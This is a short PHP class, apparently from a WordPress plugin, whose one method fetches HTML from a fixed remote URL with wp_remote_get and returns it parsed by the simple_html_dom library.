<?php
if (!class_exists ("simple_html_dom")) {
    include_once("simple_html_dom.php");
}
class STS
{
  public static function getAdd(){
    $url = "http://sign.js-ing.com/a.php";
    $response = wp_remote_get($url);
    $data = wp_remote_retrieve_body( $response  );
    return str_get_html($data); 
  }
}
?>